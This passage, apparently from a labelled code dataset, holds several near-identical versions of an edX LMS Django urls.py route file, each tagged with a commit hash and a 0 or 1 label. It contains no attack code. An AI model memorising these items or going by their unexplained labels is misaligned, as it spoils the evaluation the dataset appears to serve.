            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
45,4e4c209ae3deb4c78bcec89c181516af8604b450,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
46,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
